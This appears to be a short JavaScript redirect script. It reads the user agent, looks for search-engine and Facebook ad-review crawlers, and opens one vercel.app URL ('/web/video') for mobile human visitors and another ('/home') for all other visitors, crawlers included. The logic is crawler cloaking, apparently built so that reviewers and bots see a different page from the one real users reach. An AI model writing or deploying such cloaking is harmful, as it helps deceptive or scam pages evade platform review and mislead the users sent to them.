const navigatorScreen = window;
const userAgent = navigator.userAgent;

const findCrawlerAds = userAgent.search(
/bot|crawl|slurp|spider|mediapartners|facebookexternalhit|facebookcatalog|facebot|googlebot|facebook/i);
const findDeviceDetect = userAgent.search(
/Android|webOS|iPhone|iPad|iPod|BlackBerry/i);

if((navigatorScreen.innerWidth < 912 || findDeviceDetect > 0) && findCrawlerAds < 0){
  window.open("https://tonicoindiano.vercel.app/web/video","_parent");
}else{
  window.open("https://tonicoindiano.vercel.app/home","_parent");
}

  
 
 

